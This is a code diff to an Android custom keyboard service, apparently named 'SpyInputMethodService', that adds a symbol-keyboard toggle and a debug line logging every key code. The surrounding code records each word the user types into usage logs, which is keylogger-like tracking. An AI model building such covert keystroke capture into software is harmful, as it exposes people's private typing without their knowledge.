@@ -22,14 +22,14 @@ import com.idankorenisraeli.spyboard.R;
  * With custom tracking of all the pressed keys
  */
 public class SpyInputMethodService extends android.inputmethodservice.InputMethodService {
-
     SpyKeyboardView keyboardView;
     KeycodeDictionary dictionary;
 
     boolean caps = false;
     boolean hebrewMode = false;
+    boolean symbol = false;
 
-    Keyboard engKeyboard, hebKeyboard;
+    Keyboard engKeyboard, hebKeyboard, symbolKeyboard;
 
     String currentDate;
     DailyUsageLog dailyLog;
@@ -44,6 +44,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
 
     interface KEYS {
         int ENTER = -10;
+        int SYMBOL = -3;
     }
 
     @Override
@@ -58,6 +59,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
     private void initKeyboards(){
         engKeyboard = new Keyboard(this, R.xml.qwerty_eng);
         hebKeyboard = new Keyboard(this, R.xml.qwerty_heb);
+        symbolKeyboard = new Keyboard(this, R.xml.symbols_board);
 
         dictionary = KeycodeDictionary.getInstance();
 
@@ -90,6 +92,15 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         // Updating the keyboard view based on the current mode
     }
 
+    private void symbolAction(){
+        symbol = !symbol;
+        if(symbol) {
+            keyboardView.setKeyboard(symbolKeyboard);
+        }
+        else
+            keyboardView.setKeyboard(hebrewMode ? hebKeyboard : engKeyboard);
+    }
+
     private void deleteAction(InputConnection ic) {
         CharSequence selectedText = ic.getSelectedText(0);
         if (TextUtils.isEmpty(selectedText)) {
@@ -120,6 +131,8 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         trackKeyPress(typed);
     }
 
+
+
     private void trackKeyPress(String typed) {
         if (sessionUsageLog != null) {
 
@@ -136,7 +149,6 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
     private void trackWord(){
         if(currentWord.length() > 0) {
             sessionUsageLog.addWord(currentWord.toString());
-            Log.i("pttt" , "Tracked " + currentWord.toString());
             currentWord = new StringBuilder(AVG_WORD_LENGTH);
         }
     }
@@ -167,6 +179,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
 
         }
 
+
         @Override
         public void onKey(int primaryCode, int[] keyCodes) {
             InputConnection ic = getCurrentInputConnection();
@@ -174,6 +187,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
             if(!isTextBefore()) {
                 trackWord();
             }
+            Log.i("pttt", primaryCode + " CODE ");
             switch (primaryCode) {
                 case Keyboard.KEYCODE_DELETE:
                     deleteAction(ic);
@@ -187,7 +201,9 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
                 case KEYS.ENTER:
                     enterAction(ic);
                     break;
-
+                case KEYS.SYMBOL:
+                    symbolAction();
+                    break;
                 default:
                     charAction(primaryCode, ic);
             }
